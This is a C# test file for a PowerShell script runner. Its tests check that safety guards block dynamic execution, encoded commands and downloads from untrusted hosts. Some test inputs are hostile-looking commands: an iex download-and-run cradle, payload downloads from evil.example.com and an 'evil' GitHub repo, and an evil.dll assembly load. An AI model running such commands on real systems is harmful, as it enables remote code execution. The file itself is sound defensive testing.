using Phantom.Models;
using Phantom.Services;
using System.Reflection;

namespace Phantom.Tests;

public sealed class PowerShellRunnerTests
{
    [Fact]
    public async Task ExecuteAsync_BlocksDynamicScriptExecution_WhenSafetyGuardsEnabled()
    {
        var settings = new AppSettings();

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.dynamic",
            StepName = "apply",
            Script = "iex ((New-Object Net.WebClient).DownloadString('https://example.com/install.ps1'))",
            DryRun = false
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Contains("Blocked dynamic script execution", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_BlocksUntrustedDownloadHost_WhenSafetyGuardsEnabled()
    {
        var settings = new AppSettings();

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.host",
            StepName = "download",
            Script = "Invoke-WebRequest -Uri 'https://evil.example.com/payload.ps1' -OutFile \"$env:TEMP\\payload.ps1\"",
            DryRun = false
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Contains("Blocked download host", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_BlocksEncodedCommandAliasInvocation()
    {
        var settings = new AppSettings();

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.encoded",
            StepName = "apply",
            Script = "powershell -e SQBFAFgAIAAnAGMAYQBsAGMALgBlAHgAZQAnAA==",
            DryRun = true
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Contains("encoded command", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_AllowsTrustedHost_WhenDryRun()
    {
        var settings = new AppSettings();

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.trusted",
            StepName = "download",
            Script = "Invoke-WebRequest -Uri 'https://aka.ms/getwinget' -OutFile \"$env:TEMP\\AppInstaller.msixbundle\"",
            DryRun = true
        }, CancellationToken.None);

        Assert.True(result.Success);
        Assert.Equal(0, result.ExitCode);
    }

    [Fact]
    public async Task ExecuteAsync_BlocksUncatalogedTweakScript_WhenCatalogAllowlistEnabled()
    {
        var settings = new AppSettings();

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "tweak.test.unsafescript",
            StepName = "apply",
            Script = "Write-Output 'hello from untrusted tweak script'",
            DryRun = true
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Contains("trusted catalog allowlist", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_AllowsCatalogRegisteredTweakScript_WhenHashIsTrusted()
    {
        var settings = new AppSettings();

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var definitions = new DefinitionCatalogService(paths);
        var tweak = (await definitions.LoadTweaksAsync(CancellationToken.None)).First();
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = $"tweak.{tweak.Id}",
            StepName = "detect",
            Script = tweak.DetectScript,
            DryRun = true
        }, CancellationToken.None);

        Assert.True(result.Success);
        Assert.Equal(0, result.ExitCode);
    }

    [Fact]
    public async Task ExecuteAsync_AllowsRuntimeDnsScript_WhenHashIsTrusted()
    {
        var settings = new AppSettings();

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);
        var script = RuntimeOperationScriptCatalog.BuildDnsApplyScript("Google");

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "tweak.dns.google",
            StepName = "set-dns",
            Script = script,
            DryRun = true
        }, CancellationToken.None);

        Assert.True(result.Success);
        Assert.Equal(0, result.ExitCode);
    }

    [Fact]
    public async Task ExecuteAsync_BlocksTamperedRuntimeDnsScript_WhenHashIsNotTrusted()
    {
        var settings = new AppSettings();

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "tweak.dns.google",
            StepName = "set-dns",
            Script = "Write-Output 'tampered dns script'",
            DryRun = true
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Contains("trusted catalog allowlist", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void IsEncodedCommandParameterAlias_DoesNotTreatEncodingAsEncodedCommand()
    {
        var method = typeof(PowerShellRunner).GetMethod(
            "IsEncodedCommandParameterAlias",
            BindingFlags.NonPublic | BindingFlags.Static);

        Assert.NotNull(method);
        Assert.False((bool)method!.Invoke(null, ["Encoding"])!);
        Assert.True((bool)method.Invoke(null, ["enc"])!);
    }

    [Fact]
    public async Task ExecuteAsync_FailsRunspaceStep_WhenWingetReportsNoPackageFound()
    {
        var settings = new AppSettings();

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "store.app.firefox",
            StepName = "install",
            Script = "$ErrorActionPreference='Continue'; Write-Error 'No package found matching input criteria.'; $null = 'winget install --id Mozilla.Firefox';",
            DryRun = false,
            SkipSafetyBackup = true
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.NotEqual(0, result.ExitCode);
        Assert.Contains("No package found matching input criteria.", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_AllowsNonTerminatingRunspaceError_WhenNoWingetFailureMarkerPresent()
    {
        var settings = new AppSettings();

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "store.app.firefox",
            StepName = "install",
            Script = "$ErrorActionPreference='Continue'; Write-Error 'simulated non-terminating warning'; $null = 'winget install --id Mozilla.Firefox';",
            DryRun = false,
            SkipSafetyBackup = true
        }, CancellationToken.None);

        Assert.True(result.Success);
        Assert.Equal(0, result.ExitCode);
        Assert.Contains("simulated non-terminating warning", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_ReturnsTimeoutFailure_WhenExecutionExceedsTimeout()
    {
        var settings = new AppSettings();

        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.timeout",
            StepName = "apply",
            Script = "Start-Sleep -Seconds 5; Write-Output 'done'",
            DryRun = false,
            SkipSafetyBackup = true,
            Timeout = TimeSpan.FromMilliseconds(250)
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Equal(124, result.ExitCode);
        Assert.Contains("timed out", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_BlocksScriptBlockCreateDynamicExecution()
    {
        var settings = new AppSettings();
        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.scriptblock-create",
            StepName = "apply",
            Script = "[scriptblock]::Create('Write-Output \"x\"').Invoke()",
            DryRun = true
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Contains("scriptblock", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_BlocksInvokeScriptDynamicExecution()
    {
        var settings = new AppSettings();
        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.invokescript",
            StepName = "apply",
            Script = "$ExecutionContext.InvokeCommand.InvokeScript('Write-Output \"x\"')",
            DryRun = true
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Contains("InvokeScript", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_BlocksUsingAssemblyDirective()
    {
        var settings = new AppSettings();
        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.using-assembly",
            StepName = "apply",
            Script = "using assembly 'C:\\\\Temp\\\\evil.dll'; Write-Output 'x'",
            DryRun = true
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Contains("using", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_BlocksVariableBasedStartProcessTarget()
    {
        var settings = new AppSettings();
        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.start-process-variable",
            StepName = "apply",
            Script = "$exePath='notepad.exe'; Start-Process -FilePath $exePath",
            DryRun = true
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Contains("Start-Process", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExecuteAsync_AllowsScopedGithubRepositoryDownload_WhenDryRun()
    {
        var settings = new AppSettings();
        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.github-allowed",
            StepName = "download",
            Script = "Invoke-WebRequest -Uri 'https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle' -OutFile \"$env:TEMP\\winget.msixbundle\"",
            DryRun = true
        }, CancellationToken.None);

        Assert.True(result.Success);
        Assert.Equal(0, result.ExitCode);
    }

    [Fact]
    public async Task ExecuteAsync_BlocksUntrustedGithubRepositoryDownload_WhenDryRun()
    {
        var settings = new AppSettings();
        var paths = TestHelpers.CreateIsolatedPaths();
        var console = new ConsoleStreamService();
        var log = TestHelpers.CreateLogService(paths, () => settings);
        var runner = new PowerShellRunner(console, log, paths, () => settings);

        var result = await runner.ExecuteAsync(new PowerShellExecutionRequest
        {
            OperationId = "updates.test.github-blocked",
            StepName = "download",
            Script = "Invoke-WebRequest -Uri 'https://github.com/evil/repo/releases/download/payload.exe' -OutFile \"$env:TEMP\\payload.exe\"",
            DryRun = true
        }, CancellationToken.None);

        Assert.False(result.Success);
        Assert.Contains("Blocked download host", result.CombinedOutput, StringComparison.OrdinalIgnoreCase);
    }
}
